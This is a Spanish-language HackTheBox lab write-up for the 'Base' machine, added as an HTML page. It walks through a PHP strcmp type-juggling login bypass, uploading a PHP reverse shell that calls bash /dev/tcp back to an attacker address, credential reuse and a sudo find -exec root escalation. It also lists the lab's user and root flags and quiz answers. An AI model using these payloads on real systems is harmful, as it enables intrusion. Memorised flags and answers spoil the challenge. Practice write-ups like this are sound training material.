@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Base HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/base.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Base HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Base de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Base de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Base HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Base HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Base de la plataforma de HackTheBox","headline":"Writeup Base HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Base HackTheBox</h1>
+          <p>Resolución de la máquina Base de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.95.184
+Nmap scan report for 10.129.95.184
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Al ingresar en el nagegador podemos ver una web normal, y en la parte izquierda un botón login</p></div>
+<a href="./1.png" target="_blank"><div><p><img src="./1.png"><p></div></a>
+
+<div><p>Al abrirlo vemos el login.php pero con algo un poco extraño, esta dentro de un directorio login</p></div>
+<a href="./2.png" target="_blank"><div><p><img src="./2.png"><p></div></a>
+
+<div><p>En el directorio login podemos ver 3 archivos entre ellos un swap del login.php original</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Al ver cadenas con strings y darle la vuelta al archivo con tac podemos ver en algunas lineas un php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ strings </span><span class="p">login.php.swp | </span><span class="s2">tac</span><span class="p"> | </span><span class="s2">sed</span><span class="p"> -n 4,11p
+&lt?php
+</span><span class="k">session_start</span><span class="p">();
+</span><span class="kd">if</span><span class="p"> (</span><span class="kd">!empty</span><span class="p">($_POST[</span><span class="s2">'username'</span><span class="p">]) </span><span class="kd">&& !empty</span><span class="p">($_POST[</span><span class="s2">'password'</span><span class="p">])) {
+    </span><span class="kd">require</span><span class="p">(</span><span class="s2">'config.php'</span><span class="p">);
+    </span><span class="kd">if</span><span class="p"> (</span><span class="k">strcmp</span><span class="p">($username, $_POST[</span><span class="s2">'username'</span><span class="p">]) </span><span class="kd">== </span><span class="na">0</span><span class="p">) {
+        </span><span class="kd">if</span><span class="p"> (</span><span class="k">strcmp</span><span class="p">($password, $_POST[</span><span class="s2">'password'</span><span class="p">])</span><span class="kd"> == </span><span class="na">0</span><span class="p">) {
+            $_SESSION[</span><span class="s2">'user_id'</span><span class="p">] </span><span class="kd">=</span><span class="na"> 1</span><span class="p">;
+            </span><span class="k">header</span><span class="p">(</span><span class="s2">"Location: /upload.php"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div><p>Podemos hacer un Type Juggling ya que se usa == y solo se compara que el valor sea igual pero no el tipo de dato como se haria con ===, modificamos la petición agregando [] para que pase la comprobación del valor y nos tome un sesión valido</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Una logueados podemos ver un campo de subida de archivos</p></div>
+<a href="./5.png" target="_blank"><div><p><img src="./5.png"><p></div></a>
+
+<div><p>Definimos un php que nos envie una reverse shell y lo subimos en la web</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">&lt?php
+    </span><span class="k">system</span><span class="p">(</span><span class="s2">"bash -c 'bash -i >& /dev/tcp/10.10.14.10/443 0>&1'"</span><span class="p">)
+?></span>
+</code></pre></div></div>
+
+<div><p>Podemos usar wfuzz para encontrar el directorio donde se ha subido el archivo .php</p></div>   
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.95.184/FUZZ -t 100 --hc 404
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.129.95.184/FUZZ
+Total requests: 30000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000170:   </span><span class="na">301</span><span class="p">        9 L      28 W       314 Ch      "forms"    
+000000039:   </span><span class="na">301</span><span class="p">        9 L      28 W       314 Ch      "login"    
+000000084:   </span><span class="na">301</span><span class="p">        9 L      28 W       315 Ch      "assets"   
+000009899:   </span><span class="na">301</span><span class="p">        9 L      28 W       318 Ch      "_uploaded"</span>
+</code></pre></div></div>
+
+<div><p>Lo llamamos desde el directorio _uploades y recibimos shell como www-data</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">http://10.129.95.184/_uploaded/shell.php
+</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.129.95.184
+</span><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~/html/_uploaded</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~/html/_uploaded</span><span class="p">$ hostname -I
+10.129.95.184 dead:beef::250:56ff:feb9:2f6a 
+</span><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~/html/_uploaded</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En /var/www/html/login hay un archivo config.php que contiene credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~/html/login</span><span class="p">$ cat config.php
+&lt?php
+$username </span><span class="kd">=</span><span class="s2"> "admin"</span><span class="p">;
+$password </span><span class="kd">=</span><span class="s2"> "thisisagoodpassword"</span><span class="p">;
+</span><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~/html/login</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Solo existe el usuario john ademas de root, usamos la contraseña para covertirnos en john</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ grep sh$ /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+john:x:1000:1000:John:/home/john:/bin/bash
+</span><span class="s2">www-data@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ su john
+Password: </span><span class="kd">thisisagoodpassword</span><span class="p">
+</span><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(john) gid=1000(john) groups=1000(john)
+</span><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.129.95.184 dead:beef::250:56ff:feb9:2f6a 
+</span><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+f54846c258f3b4612f78a819573d158e
+</span><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando privilegios de sudoers tenemos permitido ejecutar como root el binario find</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for john: </span><span class="kd">thisisagoodpassword</span><span class="p">
+Matching Defaults entries for john on base:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on base:
+    (</span><span class="na">root : root</span><span class="p">)</span><span class="kd"> /usr/bin/find
+</span><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos usar el parámetro -exec para spawnearnos una bash y convertirnos en root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">john@base</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo find . -exec /bin/bash \; -quit
+</span><span class="s2">root@base</span><span class="p">:</span><span class="na">~</span><span class="p"># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@base</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.129.95.184 dead:beef::250:56ff:feb9:2f6a 
+</span><span class="s2">root@base</span><span class="p">:</span><span class="na">~</span><span class="p"># cat /root/root.txt 
+51709519ea18ab37dd6fc58096bea949
+</span><span class="s2">root@base</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>Which two TCP ports are open on the remote host?</strong></li>
+<ul><p></p><li>22,80</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the URL for the login page?</strong></li>
+<ul><p></p><li>/login/login.php</li></ul></blockquote><br>
+
+<blockquote><li><strong>How many files are present in the '/login' directory?</strong></li>
+<ul><p></p><li>3</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the file extension of a swap file?</strong></li>
+<ul><p></p><li>.swp</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password?</strong></li>
+<ul><p></p><li>strcmp()</li></ul></blockquote><br>
+
+<blockquote><li><strong>In which directory are the uploaded files stored?</strong></li>
+<ul><p></p><li>/_uploaded</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which user exists on the remote host with a home directory?</strong></li>
+<ul><p></p><li>john</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the password for the user present on the system?</strong></li>
+<ul><p></p><li>thisisagoodpassword</li></ul></blockquote><br>
+
+<blockquote><li><strong>What is the full path to the command that the user john can run as user root on the remote host?</strong></li>
+<ul><p></p><li>/usr/bin/find</li></ul></blockquote><br>
+
+<blockquote><li><strong>What action can the find command use to execute commands?</strong></li>
+<ul><p></p><li>exec</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit user flag</strong></li>
+<ul><p></p><li>f54846c258f3b4612f78a819573d158e</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>51709519ea18ab37dd6fc58096bea949</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
